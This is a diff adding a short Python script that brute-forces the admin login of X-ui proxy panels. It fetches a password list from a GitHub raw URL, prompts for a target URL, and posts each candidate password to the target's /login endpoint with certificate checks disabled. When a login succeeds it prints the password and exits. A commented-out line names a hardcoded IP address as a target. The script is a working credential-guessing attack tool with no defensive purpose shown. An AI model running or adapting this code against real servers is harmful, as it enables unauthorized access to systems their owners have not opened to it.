@@ -1,0 +1,44 @@
+import requests
+import json
+from alive_progress import alive_it
+#from urllib.parse import urlparse
+target1 = "https://raw.githubusercontent.com/beatester/passxui/main/X-ui%20Login%20Credentials.txt"
+#target1 = input('inter password list url :')
+#target2 = "http://47.251.33.193:8888/"
+target2 = input('target url :')
+#target2 = urlparse(target2)
+target2 = target2+"login"
+pasreader = requests.get(target1)
+pasreader = pasreader.text.split("\n")
+pasreads = alive_it(pasreader)
+data = {'username':'admin','password': list()}
+for pases in pasreads:
+  data['password']= pases.strip()
+  #ans11 = requests.post(target2,json={"username":"admin","password":""})
+#ans_11 = requests.post(target2,json={"username>
+  ans11 = requests.post(target2, data=data, verify = False)
+ # print(data)
+  anss = ans11.json()
+  anss1 = str(anss["success"])
+  #print(pases)
+  #print(anss1)
+  if anss1 == "True" :
+      #print("password is:"+pases)
+    print("Password: "+pases)
+    exit()
+
+#pasreads.text("Not Found")
+print("Not Found")
+  #  else:
+    #  print("password: "+pases+" was "+anss1)
+#for pases in pasreader:
+ # ans11 = requests.post(target2,json={"username":"admin","password":"pases"})
+#ans_11 = requests.post(target2,json={"username":"admin", "password" : pases})
+ # print(ans_11.json())
+#anss = ans11.json()
+#if anss["success"] == "True" :
+ # print("password is:"+pases)
+  #exit()
+
+#tstkred = respoaitar.json()
+#print(tstkred)
